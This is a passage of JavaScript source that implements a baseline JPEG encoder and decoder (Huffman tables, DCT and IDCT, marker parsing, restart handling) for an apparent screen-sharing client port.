  0x29, 0x2a, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3a, 0x43, 0x44, 0x45,
  0x46, 0x47, 0x48, 0x49, 0x4a, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59,
  0x5a, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 0x73, 0x74, 0x75,
  0x76, 0x77, 0x78, 0x79, 0x7a, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89,
  0x8a, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9a, 0xa2, 0xa3,
  0xa4, 0xa5, 0xa6, 0xa7, 0xa8, 0xa9, 0xaa, 0xb2, 0xb3, 0xb4, 0xb5, 0xb6,
  0xb7, 0xb8, 0xb9, 0xba, 0xc2, 0xc3, 0xc4, 0xc5, 0xc6, 0xc7, 0xc8, 0xc9,
  0xca, 0xd2, 0xd3, 0xd4, 0xd5, 0xd6, 0xd7, 0xd8, 0xd9, 0xda, 0xe1, 0xe2,
  0xe3, 0xe4, 0xe5, 0xe6, 0xe7, 0xe8, 0xe9, 0xea, 0xf1, 0xf2, 0xf3, 0xf4,
  0xf5, 0xf6, 0xf7, 0xf8, 0xf9, 0xfa,
];
const JPEG_AC_CHR_BITS = [0, 2, 1, 2, 4, 4, 3, 4, 7, 5, 4, 4, 0, 1, 2, 0x77];
const JPEG_AC_CHR_VALS = [
  0x00, 0x01, 0x02, 0x03, 0x11, 0x04, 0x05, 0x21, 0x31, 0x06, 0x12, 0x41,
  0x51, 0x07, 0x61, 0x71, 0x13, 0x22, 0x32, 0x81, 0x08, 0x14, 0x42, 0x91,
  0xa1, 0xb1, 0xc1, 0x09, 0x23, 0x33, 0x52, 0xf0, 0x15, 0x62, 0x72, 0xd1,
  0x0a, 0x16, 0x24, 0x34, 0xe1, 0x25, 0xf1, 0x17, 0x18, 0x19, 0x1a, 0x26,
  0x27, 0x28, 0x29, 0x2a, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3a, 0x43, 0x44,
  0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58,
  0x59, 0x5a, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 0x73, 0x74,
  0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87,
  0x88, 0x89, 0x8a, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9a,
  0xa2, 0xa3, 0xa4, 0xa5, 0xa6, 0xa7, 0xa8, 0xa9, 0xaa, 0xb2, 0xb3, 0xb4,
  0xb5, 0xb6, 0xb7, 0xb8, 0xb9, 0xba, 0xc2, 0xc3, 0xc4, 0xc5, 0xc6, 0xc7,
  0xc8, 0xc9, 0xca, 0xd2, 0xd3, 0xd4, 0xd5, 0xd6, 0xd7, 0xd8, 0xd9, 0xda,
  0xe2, 0xe3, 0xe4, 0xe5, 0xe6, 0xe7, 0xe8, 0xe9, 0xea, 0xf2, 0xf3, 0xf4,
  0xf5, 0xf6, 0xf7, 0xf8, 0xf9, 0xfa,
];

function jpegHuffmanTable(bits, vals) {
  // Dense typed-array lookup: the symbol space is 0..255, so a per-code Map
  // (an object per symbol) is unnecessary and slow on the per-frame path.
  const codes = new Int32Array(256).fill(-1);
  const lens = new Uint8Array(256);
  let code = 0, k = 0;
  for (let len = 1; len <= 16; len++) {
    for (let i = 0; i < bits[len - 1]; i++) {
      const sym = vals[k++];
      codes[sym] = code++;
      lens[sym] = len;
    }
    code <<= 1;
  }
  if (k !== vals.length) throw new Error('JPEG Huffman table size mismatch');
  return { codes, lens };
}
const JPEG_DC_LUM_TABLE = jpegHuffmanTable(JPEG_DC_LUM_BITS, JPEG_DC_VALS);
const JPEG_DC_CHR_TABLE = jpegHuffmanTable(JPEG_DC_CHR_BITS, JPEG_DC_VALS);
const JPEG_AC_LUM_TABLE = jpegHuffmanTable(JPEG_AC_LUM_BITS, JPEG_AC_LUM_VALS);
const JPEG_AC_CHR_TABLE = jpegHuffmanTable(JPEG_AC_CHR_BITS, JPEG_AC_CHR_VALS);

const JPEG_COS = (() => {
  const t = new Float32Array(64);
  for (let u = 0; u < 8; u++) {
    for (let x = 0; x < 8; x++) {
      t[u * 8 + x] = Math.cos(((2 * x + 1) * u * Math.PI) / 16);
    }
  }
  return t;
})();
const JPEG_C = [1 / Math.SQRT2, 1, 1, 1, 1, 1, 1, 1];

function jpegQualityTable(base, quality) {
  const q = Math.max(1, Math.min(100, quality));
  const scale = q < 50 ? Math.floor(5000 / q) : 200 - q * 2;
  const out = new Int32Array(64);
  for (let i = 0; i < 64; i++) {
    out[i] = Math.max(1, Math.min(255, Math.floor((base[i] * scale + 50) / 100)));
  }
  return out;
}

class JpegBitWriter {
  constructor() {
    this.buf = Buffer.alloc(65536);
    this.len = 0;
    this.acc = 0;
    this.bits = 0;
  }
  _byte(v) {
    if (this.len + 2 > this.buf.length) {
      const next = Buffer.alloc(this.buf.length * 2);
      this.buf.copy(next, 0, 0, this.len);
      this.buf = next;
    }
    this.buf[this.len++] = v & 0xff;
    if ((v & 0xff) === 0xff) this.buf[this.len++] = 0;
  }
  write(value, length) {
    if (!length) return;
    this.acc = (this.acc << length) | (value & ((1 << length) - 1));
    this.bits += length;
    while (this.bits >= 8) {
      this.bits -= 8;
      this._byte((this.acc >>> this.bits) & 0xff);
    }
    this.acc &= (1 << this.bits) - 1;
  }
  finish() {
    if (this.bits > 0) {
      this._byte((this.acc << (8 - this.bits)) & 0xff);
      this.acc = 0; this.bits = 0;
    }
    return this.buf.subarray(0, this.len);
  }
}

function jpegCategory(value) {
  let v = Math.abs(value);
  let n = 0;
  while (v) { n++; v >>= 1; }
  return n;
}
const JPEG_ENC_TMP = new Float32Array(64);
const JPEG_ENC_COEF = new Int32Array(64);
const JPEG_ENC_COL = new Float64Array(8);

// Even/odd split of the 8-point DCT-II: for even u the symmetric pairs add
// and for odd u they subtract, so each 1-D transform costs four 4-term dot
// products (32 multiplies) instead of eight 8-term ones.  Verified
// coefficient-for-coefficient against the direct definition.
const JPEG_DCT_EVEN = new Float64Array(16);
const JPEG_DCT_ODD = new Float64Array(16);
for (let k = 0; k < 4; k++) {
  for (let n = 0; n < 4; n++) {
    JPEG_DCT_EVEN[k * 4 + n] = Math.cos(((2 * n + 1) * k * Math.PI) / 8);
    JPEG_DCT_ODD[k * 4 + n] = Math.cos(((2 * n + 1) * (2 * k + 1) * Math.PI) / 16);
  }
}
const JPEG_C0 = JPEG_C[0];

function jpegDctRows(block, tmp) {
  const E = JPEG_DCT_EVEN;
  const O = JPEG_DCT_ODD;
  for (let y = 0; y < 8; y++) {
    const base = y << 3;
    const f0 = block[base]; const f1 = block[base + 1];
    const f2 = block[base + 2]; const f3 = block[base + 3];
    const f4 = block[base + 4]; const f5 = block[base + 5];
    const f6 = block[base + 6]; const f7 = block[base + 7];
    const s0 = f0 + f7; const s1 = f1 + f6; const s2 = f2 + f5; const s3 = f3 + f4;
    const d0 = f0 - f7; const d1 = f1 - f6; const d2 = f2 - f5; const d3 = f3 - f4;
    tmp[base] = (s0 * E[0] + s1 * E[1] + s2 * E[2] + s3 * E[3]) * JPEG_C0;
    tmp[base + 2] = s0 * E[4] + s1 * E[5] + s2 * E[6] + s3 * E[7];
    tmp[base + 4] = s0 * E[8] + s1 * E[9] + s2 * E[10] + s3 * E[11];
    tmp[base + 6] = s0 * E[12] + s1 * E[13] + s2 * E[14] + s3 * E[15];
    tmp[base + 1] = d0 * O[0] + d1 * O[1] + d2 * O[2] + d3 * O[3];
    tmp[base + 3] = d0 * O[4] + d1 * O[5] + d2 * O[6] + d3 * O[7];
    tmp[base + 5] = d0 * O[8] + d1 * O[9] + d2 * O[10] + d3 * O[11];
    tmp[base + 7] = d0 * O[12] + d1 * O[13] + d2 * O[14] + d3 * O[15];
  }
}

function jpegDctCols(block, tmp, quant, coef) {
  const E = JPEG_DCT_EVEN;
  const O = JPEG_DCT_ODD;
  const col = JPEG_ENC_COL;
  for (let u = 0; u < 8; u++) {
    col[0] = tmp[u]; col[1] = tmp[8 + u]; col[2] = tmp[16 + u]; col[3] = tmp[24 + u];
    col[4] = tmp[32 + u]; col[5] = tmp[40 + u]; col[6] = tmp[48 + u]; col[7] = tmp[56 + u];
    const f0 = col[0]; const f1 = col[1]; const f2 = col[2]; const f3 = col[3];
    const f4 = col[4]; const f5 = col[5]; const f6 = col[6]; const f7 = col[7];
    const s0 = f0 + f7; const s1 = f1 + f6; const s2 = f2 + f5; const s3 = f3 + f4;
    const d0 = f0 - f7; const d1 = f1 - f6; const d2 = f2 - f5; const d3 = f3 - f4;
    coef[u] = Math.round((s0 * E[0] + s1 * E[1] + s2 * E[2] + s3 * E[3]) * JPEG_C0 * 0.25 / quant[u]);
    coef[16 + u] = Math.round((s0 * E[4] + s1 * E[5] + s2 * E[6] + s3 * E[7]) * 0.25 / quant[16 + u]);
    coef[32 + u] = Math.round((s0 * E[8] + s1 * E[9] + s2 * E[10] + s3 * E[11]) * 0.25 / quant[32 + u]);
    coef[48 + u] = Math.round((s0 * E[12] + s1 * E[13] + s2 * E[14] + s3 * E[15]) * 0.25 / quant[48 + u]);
    coef[8 + u] = Math.round((d0 * O[0] + d1 * O[1] + d2 * O[2] + d3 * O[3]) * 0.25 / quant[8 + u]);
    coef[24 + u] = Math.round((d0 * O[4] + d1 * O[5] + d2 * O[6] + d3 * O[7]) * 0.25 / quant[24 + u]);
    coef[40 + u] = Math.round((d0 * O[8] + d1 * O[9] + d2 * O[10] + d3 * O[11]) * 0.25 / quant[40 + u]);
    coef[56 + u] = Math.round((d0 * O[12] + d1 * O[13] + d2 * O[14] + d3 * O[15]) * 0.25 / quant[56 + u]);
  }
}

function jpegEncodeBlock(block, quant) {
  // Separable 8x8 DCT straight into the shared quantised-coefficient scratch
  // (no per-block allocation on the streaming hot path).
  const tmp = JPEG_ENC_TMP;
  jpegDctRows(block, tmp);
  jpegDctCols(block, tmp, quant, JPEG_ENC_COEF);
  return JPEG_ENC_COEF;
}

function jpegWriteBlock(writer, block, quant, dcTable, acTable, lastDC) {
  const coef = jpegEncodeBlock(block, quant);
  const dc = coef[0];
  const diff = dc - lastDC.value;
  const cat = jpegCategory(diff);
  writer.write(dcTable.codes[cat], dcTable.lens[cat]);
  if (cat) writer.write(diff < 0 ? diff - 1 : diff, cat);

  let run = 0;
  for (let k = 1; k < 64; k++) {
    const v = coef[JPEG_ZIGZAG[k]];
    if (v === 0) { run++; continue; }
    while (run > 15) {
      writer.write(acTable.codes[0xf0], acTable.lens[0xf0]);
      run -= 16;
    }
    const n = jpegCategory(v);
    const sym = (run << 4) | n;
    const code = acTable.codes[sym];
    if (code < 0) throw new Error('JPEG Huffman symbol missing: ' + sym);
    writer.write(code, acTable.lens[sym]);
    writer.write(v < 0 ? v - 1 : v, n);
    run = 0;
  }
  if (run > 0) writer.write(acTable.codes[0x00], acTable.lens[0x00]);
  lastDC.value = dc;
}

// Growable byte sink for the marker segments (the entropy scan has its own
// bit writer).  A Buffer avoids one JS array element per output byte.
class JpegOut {
  constructor() { this.buf = Buffer.alloc(1 << 16); this.len = 0; }
  u8(v) {
    if (this.len >= this.buf.length) {
      const next = Buffer.alloc(this.buf.length * 2);
      this.buf.copy(next, 0, 0, this.len);
      this.buf = next;
    }
    this.buf[this.len++] = v & 0xff;
  }
  u16(v) { this.u8((v >> 8) & 0xff); this.u8(v & 0xff); }
  marker(m) { this.u8(0xff); this.u8(m); }
  raw(segment) {
    if (this.len + segment.length > this.buf.length) {
      let cap = this.buf.length * 2;
      while (cap < this.len + segment.length) cap *= 2;
      const next = Buffer.alloc(cap);
      this.buf.copy(next, 0, 0, this.len);
      this.buf = next;
    }
    segment.copy(this.buf, this.len);
    this.len += segment.length;
  }
  finish() { return this.buf.subarray(0, this.len); }
}

function encodeJpeg(image, quality = 70) {
  const { width, height, data } = image;
  if (!width || !height) throw new Error('empty JPEG image');
  const lumQ = jpegQualityTable(JPEG_LUM_QUANT, quality);
  const chrQ = jpegQualityTable(JPEG_CHR_QUANT, quality);
  const mcuW = Math.ceil(width / 16), mcuH = Math.ceil(height / 16);
  const out = new JpegOut();
  out.marker(0xd8);
  // APP0 JFIF
  out.marker(0xe0); out.u16(16);
  out.raw(Buffer.from([0x4a, 0x46, 0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00]));
  // DQT
  out.marker(0xdb); out.u16(2 + 2 * 65);
  out.u8(0x00);
  for (let i = 0; i < 64; i++) out.u8(lumQ[JPEG_ZIGZAG[i]]);
  out.u8(0x01);
  for (let i = 0; i < 64; i++) out.u8(chrQ[JPEG_ZIGZAG[i]]);
  // SOF0
  out.marker(0xc0); out.u16(17);
  out.u8(8); out.u16(height); out.u16(width); out.u8(3);
  out.u8(1); out.u8(0x22); out.u8(0x00);
  out.u8(2); out.u8(0x11); out.u8(0x01);
  out.u8(3); out.u8(0x11); out.u8(0x01);
  // DHT
  const dht = (cls, id, bits, vals) => {
    out.marker(0xc4);
    out.u16(2 + 1 + 16 + vals.length);
    out.u8((cls << 4) | id);
    for (const b of bits) out.u8(b);
    for (const v of vals) out.u8(v);
  };
  dht(0, 0, JPEG_DC_LUM_BITS, JPEG_DC_VALS);
  dht(1, 0, JPEG_AC_LUM_BITS, JPEG_AC_LUM_VALS);
  dht(0, 1, JPEG_DC_CHR_BITS, JPEG_DC_VALS);
  dht(1, 1, JPEG_AC_CHR_BITS, JPEG_AC_CHR_VALS);
  // SOS
  out.marker(0xda); out.u16(12);
  out.u8(3); out.u8(1); out.u8(0x00); out.u8(2); out.u8(0x11);
  out.u8(3); out.u8(0x11); out.u8(0); out.u8(63); out.u8(0);

  const writer = new JpegBitWriter();
  const yBlock = new Float32Array(64);
  const cbBlock = new Float32Array(64);
  const crBlock = new Float32Array(64);
  const lastY = { value: 0 }, lastCb = { value: 0 }, lastCr = { value: 0 };
  for (let my = 0; my < mcuH; my++) {
    for (let mx = 0; mx < mcuW; mx++) {
      for (let by = 0; by < 2; by++) {
        for (let bx = 0; bx < 2; bx++) {
          const ox = mx * 16 + bx * 8;
          const oy = my * 16 + by * 8;
          for (let y = 0; y < 8; y++) {
            let sy = oy + y;
            if (sy >= height) sy = height - 1;
            const row = sy * width;
            const dst = y << 3;
            for (let x = 0; x < 8; x++) {
              let sx = ox + x;
              if (sx >= width) sx = width - 1;
              const o = (row + sx) * 3;
              yBlock[dst + x] = 0.299 * data[o] + 0.587 * data[o + 1]
                + 0.114 * data[o + 2] - 128;
            }
          }
          jpegWriteBlock(writer, yBlock, lumQ, JPEG_DC_LUM_TABLE, JPEG_AC_LUM_TABLE, lastY);
        }
      }
      for (let y = 0; y < 8; y++) {
        const ry0 = my * 16 + y * 2;
        const ry1 = Math.min(height - 1, ry0 + 1);
        const r0 = ry0 * width;
        const r1 = ry1 * width;
        const dst = y << 3;
        for (let x = 0; x < 8; x++) {
          const rx0 = mx * 16 + x * 2;
          const rx1 = Math.min(width - 1, rx0 + 1);
          const p00 = (r0 + rx0) * 3, p10 = (r0 + rx1) * 3;
          const p01 = (r1 + rx0) * 3, p11 = (r1 + rx1) * 3;
          const r = (data[p00] + data[p10] + data[p01] + data[p11]) * 0.25;
          const g = (data[p00 + 1] + data[p10 + 1] + data[p01 + 1] + data[p11 + 1]) * 0.25;
          const b = (data[p00 + 2] + data[p10 + 2] + data[p01 + 2] + data[p11 + 2]) * 0.25;
          cbBlock[dst + x] = -0.168736 * r - 0.331264 * g + 0.5 * b;
          crBlock[dst + x] = 0.5 * r - 0.418688 * g - 0.081312 * b;
        }
      }
      jpegWriteBlock(writer, cbBlock, chrQ, JPEG_DC_CHR_TABLE, JPEG_AC_CHR_TABLE, lastCb);
      jpegWriteBlock(writer, crBlock, chrQ, JPEG_DC_CHR_TABLE, JPEG_AC_CHR_TABLE, lastCr);
    }
  }
  out.raw(writer.finish());
  out.marker(0xd9);
  return Buffer.from(out.finish());
}

function imageToJpeg(buffer, { maxWidth, maxHeight, quality, screenshot = false } = {}) {
  if (buffer.length >= 3 && buffer[0] === 0xff && buffer[1] === 0xd8 && buffer[2] === 0xff) {
    return buffer;
  }
  let image = decodeImage(buffer);
  if (maxWidth && maxHeight) image = fitRgb(image, maxWidth, maxHeight);
  return encodeJpeg(image, quality || (screenshot ? SCREENSHOT_JPEG_QUALITY : SCREEN_JPEG_QUALITY));
}

// ---------------------------------------------------------------------------
// Baseline JPEG decode (SOF0/SOF1, 8-bit, Huffman)
//
// The Python and C# clients ask grim -t jpeg / screencapture -t jpg and decode
// the result with a native library.  Without a decoder this port had to
// capture PNG (grim's PNG encoder is ~6x slower than its JPEG encoder) and
// inflate it in JS, which is what made screen sharing slow.  With this decoder
// the capture path matches the reference clients: JPEG out of the tool, one
// pass over the pixels here.
//
// Handles grayscale and YCbCr, any sampling factors, restart markers, 16-bit
// quant tables and SOF1.  Progressive (SOF2) images are rejected - none of the
// capture tools produce them.
// ---------------------------------------------------------------------------
const JPEG_IDCT_T = (() => {
  const t = new Float32Array(64);
  for (let u = 0; u < 8; u++) {
    const c = (u === 0 ? 1 / Math.SQRT2 : 1) * 0.5;
    for (let x = 0; x < 8; x++) {
      t[(u << 3) + x] = c * Math.cos(((2 * x + 1) * u * Math.PI) / 16);
    }
  }
  return t;
})();
const JPEG_IDCT_TMP = new Float32Array(64);
const JPEG_READ_BLOCK = new Int32Array(64);
const JPEG_READ_PIXELS = new Uint8Array(64);

// Annex F style decode tables: mincode/maxcode/valptr per code length plus the
// sorted value list.  The bit-by-bit walk is a handful of iterations per
// symbol and avoids a 64 KiB fast-lookup table per scan.
function jpegBuildHuff(bits, vals) {
  const table = {
    mincode: new Int32Array(17),
    maxcode: new Int32Array(17).fill(-1),
    valptr: new Int32Array(17),
    huffval: Uint8Array.from(vals),
    // Byte-at-a-time fast path: one 256-entry table resolves every code of 8
    // bits or less (all but a handful of AC symbols).
    fast: new Int32Array(256).fill(-1),
  };
  let code = 0;
  let k = 0;
  for (let len = 1; len <= 16; len++) {
    const count = bits[len - 1];
    if (count > 0) {
      table.valptr[len] = k;
      table.mincode[len] = code;
      if (len <= 8) {
        const shift = 8 - len;
        for (let i = 0; i < count; i++) {
          const start = (code + i) << shift;
          const fill = (len << 16) | table.huffval[k + i];
          for (let j = 0; j < (1 << shift); j++) table.fast[start + j] = fill;
        }
      }
      code += count;
      table.maxcode[len] = code - 1;
      k += count;
    }
    code <<= 1;
  }
  if (k !== table.huffval.length) throw new Error('JPEG Huffman table size mismatch');
  return table;
}

// 8x8 inverse DCT: seperable passes with a fast path for blocks/columns whose
// AC coefficients are all zero (most blocks in a screen capture).  Input is
// natural-order dequantized coefficients, output is clamped 0..255 samples.
function jpegIdctBlock(coef, out) {
  const T = JPEG_IDCT_T;
  const tmp = JPEG_IDCT_TMP;
  for (let v = 0; v < 8; v++) {
    const base = v << 3;
    const d0 = coef[base];
    let acZero = true;
    for (let u = 1; u < 8; u++) {
      if (coef[base + u] !== 0) { acZero = false; break; }
    }
    if (acZero) {
      const g = d0 * T[0];
      tmp[base] = g; tmp[base + 1] = g; tmp[base + 2] = g; tmp[base + 3] = g;
      tmp[base + 4] = g; tmp[base + 5] = g; tmp[base + 6] = g; tmp[base + 7] = g;
      continue;
    }
    for (let x = 0; x < 8; x++) {
      let s = d0 * T[x];
      for (let u = 1; u < 8; u++) {
        const c = coef[base + u];
        if (c !== 0) s += c * T[(u << 3) + x];
      }
      tmp[base + x] = s;
    }
  }
  for (let x = 0; x < 8; x++) {
    let acZero = true;
    for (let v = 1; v < 8; v++) {
      if (tmp[(v << 3) + x] !== 0) { acZero = false; break; }
    }
    if (acZero) {
      let val = tmp[x] * T[0] + 128;
      if (val < 0) val = 0;
      else if (val > 255) val = 255;
      else val = (val + 0.5) | 0;
      out[x] = val; out[x + 8] = val; out[x + 16] = val; out[x + 24] = val;
      out[x + 32] = val; out[x + 40] = val; out[x + 48] = val; out[x + 56] = val;
      continue;
    }
    for (let y = 0; y < 8; y++) {
      let s = tmp[x] * T[y] + 128;
      for (let v = 1; v < 8; v++) {
        const c = tmp[(v << 3) + x];
        if (c !== 0) s += c * T[(v << 3) + y];
      }
      out[(y << 3) + x] = s < 0 ? 0 : s > 255 ? 255 : (s + 0.5) | 0;
    }
  }
}

// One entropy-coded block: DC prediction, AC run/length symbols, then IDCT.
function jpegReadBlock(reader, comp) {
  const block = JPEG_READ_BLOCK;
  block.fill(0);
  const t = reader.huff(comp.dcTable);
  let diff = 0;
  if (t > 0) {
    const v = reader.bits(t);
    diff = v < (1 << (t - 1)) ? v - (1 << t) + 1 : v;
  }
  comp.pred += diff;
  block[0] = comp.pred * comp.quant[0];
  let k = 1;
  while (k < 64) {
    const rs = reader.huff(comp.acTable);
    const s = rs & 15;
    const r = rs >> 4;
    if (s === 0) {
      if (r !== 15) break;            // EOB
      k += 16;
      continue;
    }
    k += r;
    if (k > 63) break;
    const v = reader.bits(s);
    const val = v < (1 << (s - 1)) ? v - (1 << s) + 1 : v;
    const natural = JPEG_ZIGZAG[k];
    block[natural] = val * comp.quant[natural];
    k += 1;
  }
  jpegIdctBlock(block, JPEG_READ_PIXELS);
}

function decodeJpeg(buffer) {
  const len = buffer.length;
  if (len < 4 || buffer[0] !== 0xff || buffer[1] !== 0xd8) {
    throw new Error('not a JPEG image');
  }
  let pos = 2;
  let width = 0;
  let height = 0;
  let precision = 8;
  let restartInterval = 0;
  let maxH = 1;
  let maxV = 1;
  let comps = [];
  const quants = new Map();
  const dcTables = new Map();
  const acTables = new Map();

  while (pos + 1 < len) {
    while (pos < len && buffer[pos] !== 0xff) pos += 1;
    if (pos + 1 >= len) break;
    const marker = buffer[pos + 1];
    pos += 2;
    if (marker === 0xd8 || marker === 0x01 || (marker >= 0xd0 && marker <= 0xd7)) continue;
    if (marker === 0xd9) break;
    if (pos + 2 > len) break;
    const segLen = buffer.readUInt16BE(pos);
    if (segLen < 2) throw new Error('bad JPEG segment length');
    const segEnd = pos + segLen;
    if (segEnd > len + 1) throw new Error('truncated JPEG segment');
    const seg = buffer.subarray(pos + 2, Math.min(segEnd, len));
    if (marker === 0xdb) {
      let p = 0;
      while (p < seg.length) {
        const pq = seg[p] >> 4;
        const tq = seg[p] & 15;
        p += 1;
        const table = new Int32Array(64);
        if (pq === 0) {
          if (p + 64 > seg.length) throw new Error('truncated JPEG quant table');
          for (let i = 0; i < 64; i++) table[JPEG_ZIGZAG[i]] = seg[p + i];
          p += 64;
        } else {
          if (p + 128 > seg.length) throw new Error('truncated JPEG quant table');
          for (let i = 0; i < 64; i++) {
            table[JPEG_ZIGZAG[i]] = seg.readUInt16BE(p + i * 2);
          }
          p += 128;
        }
        quants.set(tq, table);
      }
    } else if (marker === 0xc0 || marker === 0xc1) {
      precision = seg[0];
      height = seg.readUInt16BE(1);
      width = seg.readUInt16BE(3);
      const n = seg[5];
      if (n < 1 || n > 4) throw new Error('unsupported JPEG component count');
      comps = [];
      maxH = 1;
      maxV = 1;
      for (let i = 0; i < n; i++) {
        const o = 6 + i * 3;
        const h = seg[o + 1] >> 4;
        const v = seg[o + 1] & 15;
        if (h < 1 || v < 1 || h > 4 || v > 4) throw new Error('bad JPEG sampling factor');
        comps.push({ id: seg[o], h, v, tq: seg[o + 2], td: 0, ta: 0, pred: 0 });
        if (h > maxH) maxH = h;
        if (v > maxV) maxV = v;
      }
    } else if (marker === 0xc2) {
      throw new Error('progressive JPEG is not supported');
    } else if (marker === 0xc4) {
      let p = 0;
      while (p < seg.length) {
        const tc = seg[p] >> 4;
        const th = seg[p] & 15;
        p += 1;
        if (p + 16 > seg.length) throw new Error('truncated JPEG Huffman table');
        const bits = seg.subarray(p, p + 16);
        let total = 0;
        for (let i = 0; i < 16; i++) total += bits[i];
        p += 16;
        if (p + total > seg.length) throw new Error('truncated JPEG Huffman table');
        const table = jpegBuildHuff(bits, seg.subarray(p, p + total));
        p += total;
        if (tc === 0) dcTables.set(th, table);
        else acTables.set(th, table);
      }
    } else if (marker === 0xdd) {
      restartInterval = seg.readUInt16BE(0);
    } else if (marker === 0xda) {
      const ns = seg[0];
      for (let i = 0; i < ns; i++) {
        const o = 1 + i * 2;
        const comp = comps.find((c) => c.id === seg[o]);
        if (!comp) throw new Error('JPEG scan references an unknown component');
        comp.td = seg[o + 1] >> 4;
        comp.ta = seg[o + 1] & 15;
        comp.dcTable = dcTables.get(comp.td);
        comp.acTable = acTables.get(comp.ta);
        if (!comp.dcTable || !comp.acTable) throw new Error('JPEG component has no Huffman table');
        comp.quant = quants.get(comp.tq);
        if (!comp.quant) throw new Error('JPEG component has no quantisation table');
      }
      const ss = seg[1 + ns * 2];
      const se = seg[2 + ns * 2];
      if (ss !== 0 || se !== 63) throw new Error('unsupported JPEG scan parameters');
      const image = decodeJpegScan(buffer, segEnd, {
        width, height, comps, maxH, maxV, restartInterval, precision,
      });
      return image;
    }
    pos = segEnd;
  }
  throw new Error('JPEG has no scan data');
}

function decodeJpegScan(buffer, scanStart, ctx) {
  const { width, height, comps, maxH, maxV, restartInterval, precision } = ctx;
  if (precision !== 8) throw new Error('unsupported JPEG sample precision');
  if (!width || !height) throw new Error('JPEG has no frame header');
  const mcuW = 8 * maxH;
  const mcuH = 8 * maxV;
  const mcuCols = Math.ceil(width / mcuW);
  const mcuRows = Math.ceil(height / mcuH);
  for (const c of comps) {
    c.pw = mcuCols * 8 * c.h;
    c.ph = mcuRows * 8 * c.v;
    c.plane = new Uint8Array(c.pw * c.ph);
  }

  // Entropy-coded bit reader with 0xFF00 stuffing and restart markers.  The
  // fill loop is inlined (a marker byte is never consumed, so over-reading
  // ahead of a restart boundary is safe: the buffer is dropped there).
  let bp = scanStart;
  let bitBuf = 0;
  let bitCnt = 0;
  let ended = false;
  const ensure = (n) => {
    while (bitCnt < n) {
      if (ended || bp >= buffer.length) { ended = true; break; }
      const b = buffer[bp++];
      if (b === 0xff) {
        const m = bp < buffer.length ? buffer[bp] : 0;
        if (m === 0x00) {
          bp += 1;                            // stuffed byte
        } else {
          bp -= 1;                            // restart/EOI: leave it in place
          ended = true;
          break;
        }
      }
      bitBuf = (bitBuf << 8) | b;
      bitCnt += 8;
    }
  };
  const bits = (n) => {
    ensure(n);
    if (bitCnt < n) { bitCnt = 0; return 0; }
    const v = (bitBuf >>> (bitCnt - n)) & ((1 << n) - 1);
    bitCnt -= n;
    return v;
  };
  const huff = (table) => {
    ensure(8);
    if (bitCnt >= 8) {
      const entry = table.fast[(bitBuf >>> (bitCnt - 8)) & 0xff];
      if (entry >= 0) {
        bitCnt -= entry >>> 16;
        return entry & 0xffff;
      }
    }
    let code = bits(1);
    let l = 1;
    while (l < 16 && code > table.maxcode[l]) {
      code = (code << 1) | bits(1);
      l += 1;
    }
    if (code > table.maxcode[l]) throw new Error('bad JPEG Huffman code');
    return table.huffval[table.valptr[l] + code - table.mincode[l]];
  };
  const reader = { bits, huff };

  let mcuIndex = 0;
  for (let my = 0; my < mcuRows; my++) {
    for (let mx = 0; mx < mcuCols; mx++) {
      if (restartInterval > 0 && mcuIndex > 0 && mcuIndex % restartInterval === 0) {
        bitCnt = 0;
        bitBuf = 0;
        if (bp + 1 < buffer.length && buffer[bp] === 0xff
          && buffer[bp + 1] >= 0xd0 && buffer[bp + 1] <= 0xd7) {
          bp += 2;
        }
        for (const c of comps) c.pred = 0;
      }
      for (const c of comps) {
        const baseX = mx * 8 * c.h;
        const baseY = my * 8 * c.v;
        for (let by = 0; by < c.v; by++) {
          for (let bx = 0; bx < c.h; bx++) {
            jpegReadBlock(reader, c);
            const ox = baseX + bx * 8;
            const oy = baseY + by * 8;
            const pix = JPEG_READ_PIXELS;
            for (let y = 0; y < 8; y++) {
              const o = (oy + y) * c.pw + ox;
              const p = y << 3;
              c.plane[o] = pix[p];
              c.plane[o + 1] = pix[p + 1];
              c.plane[o + 2] = pix[p + 2];
              c.plane[o + 3] = pix[p + 3];
              c.plane[o + 4] = pix[p + 4];
              c.plane[o + 5] = pix[p + 5];
              c.plane[o + 6] = pix[p + 6];
              c.plane[o + 7] = pix[p + 7];
            }
          }
        }
      }
      mcuIndex += 1;
      if (ended) break;
    }
    if (ended) break;
  }

  // Upsample and convert.  Nearest-neighbour chroma is what the streaming
  // quality needs; the plane index maps are computed once per component.
  const out = Buffer.allocUnsafe(width * height * 3);
  if (comps.length === 1) {
    const Y = comps[0];
    const cx = new Int32Array(width);
    const cy = new Int32Array(height);
    for (let x = 0; x < width; x++) cx[x] = Math.min(Y.pw - 1, (x * Y.h / maxH) | 0);
    for (let y = 0; y < height; y++) cy[y] = Math.min(Y.ph - 1, (y * Y.v / maxV) | 0);
    let o = 0;
    for (let y = 0; y < height; y++) {
      const row = cy[y] * Y.pw;
      for (let x = 0; x < width; x++) {
        const g = Y.plane[row + cx[x]];
        out[o++] = g; out[o++] = g; out[o++] = g;
      }
    }
    return { width, height, data: out };
  }
  if (comps.length !== 3) throw new Error('unsupported JPEG colour layout');
  const maps = comps.map((c) => {
    const cx = new Int32Array(width);
    const cy = new Int32Array(height);
    for (let x = 0; x < width; x++) cx[x] = Math.min(c.pw - 1, (x * c.h / maxH) | 0);
    for (let y = 0; y < height; y++) cy[y] = Math.min(c.ph - 1, (y * c.v / maxV) | 0);
    return { cx, cy };
  });
  const [Y, Cb, Cr] = comps;
  const yP = Y.plane;
  const cbP = Cb.plane;
  const crP = Cr.plane;
  const yMap = maps[0];
  const cbMap = maps[1];
  const crMap = maps[2];
  // Per-channel contribution tables + a clamp table: the inner loop becomes
